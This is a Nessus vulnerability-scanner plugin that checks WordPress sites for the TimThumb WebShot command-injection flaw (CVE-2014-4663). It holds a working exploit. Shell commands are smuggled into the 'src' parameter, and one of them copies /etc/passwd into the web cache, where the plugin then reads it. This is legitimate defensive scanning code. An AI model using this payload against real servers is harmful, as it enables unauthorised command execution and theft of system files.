#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76874);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/06 17:22:03 $");

  script_cve_id("CVE-2014-4663");
  script_bugtraq_id(68180);
  script_osvdb_id(108398);
  script_xref(name:"EDB-ID", value:"33851");

  script_name(english:"TimThumb 'timthumb.php' WebShot 'src' Parameter Remote Command Execution");
  script_summary(english:"Attempts to execute a command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a remote
command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The TimThumb 'timthumb.php' script installed on the remote host is
affected by a remote command execution vulnerability due to a failure
to properly sanitize user-supplied input to the 'src' parameter. A
remote, unauthenticated attacker can leverage this issue to execute
arbitrary commands on the remote host.

Note that the script is only affected when the 'WebShot' feature is
enabled.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Jun/117");
  script_set_attribute(attribute:"see_also", value:"https://code.google.com/p/timthumb/source/detail?r=219");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.8.14 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/07/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:binarymoon:timthumb");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:timthumb:timthumb");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "wordpress_timthumb_detect.nbin");
  script_require_keys("installed_sw/WordPress", "installed_sw/TimThumb", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
plugin = "TimThumb";

get_install_count(app_name:plugin, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : plugin,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

token = rand_str();
# Send request to script to generate an error and get the full path
res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "?webshot=0&src=http://localhost/$(nessus-" +token+ ")",
  exit_on_fail : TRUE
);

if ("A TimThumb error has" >< res[2])
{
  match = eregmatch(pattern:"Mimetype = ''((.+)/cache/)", string:res[2]);
  if (!isnull(match))
    path = match[1];
}

if (path == "" || isnull(path))
  exit(0, "Unable to obtain the full path to the " +plugin+ " script at " +
  install_url + ".");

script = SCRIPT_NAME - ".nasl" + "-" + unixtime();
file = "/etc/passwd";
attack = "?webshot=1&src=http://localhost/$(cp$IFS" + file +"$IFS" + path +
  script + ".txt)";

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + attack,
  exit_on_fail : TRUE
);

out_path = NULL;
report_url = NULL;

# Get path without the *.php script name appended to it
match2 = eregmatch(pattern:"(^.*)(/.+\.php)$", string:dir);
if (!isnull(match2))
  out_path = match2[1];

match3 = eregmatch(pattern:"(^.*)(/.+\.php)$", string:install_url);
if (!isnull(match3))
  report_url = match3[1];

if (
  (isnull(out_path) || out_path == "") ||
  (isnull(report_url) || report_url == "")
)
exit(1, "Failed to parse required path data");

# Verify our attack worked
report_url = report_url + "/cache/" + script + ".txt";
out_path = out_path + "/cache/" + script + ".txt";

res2 = http_send_recv3(
  method : "GET",
  port   : port,
  item   : out_path,
  exit_on_fail : TRUE
);

if (egrep(pattern:"root:.*:0:[01]:", string:res2[2]))
{
  if (report_verbosity > 0)
  {
    snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\n' + 'Nessus was able to exploit the issue to retrieve the contents of ' +
      '\n' + '"' + file + '" using the following request :' +
      '\n' +
      '\n' + report_url +
      '\n' +
      '\n' + 'The file was created with the following request : '+
      '\n' +
      '\n' + install_url + attack +
      '\n';

    if (report_verbosity > 1)
    {
      if (
        !defined_func("nasl_level") ||
        nasl_level() < 5200 ||
        !isnull(get_preference("sc_version"))
      )
      {
        report +=
          '\n' + 'This produced the following truncated output :' +
          '\n' + snip +
          '\n' + beginning_of_response(resp:res2[2], max_lines:'10') +
          '\n' + snip +
          '\n';
        security_warning(port:port, extra:report);
      }
      else
      {
        # Sanitize file names
        if ("/" >< file) file = ereg_replace(
          pattern:"^.+/([^/]+)$", replace:"\1", string:file);
        report +=
          '\n' + 'Attached is a copy of the response' + '\n';
        attachments = make_list();
        attachments[0] = make_array();
        attachments[0]["type"] = "text/plain";
        attachments[0]["name"] = file;
        attachments[0]["value"] = chomp(res2[2]);
        security_report_with_attachments(
          port  : port,
          level : 2,
          extra : report,
          attachments : attachments
        );
      }
    }
    else security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin+ " script");
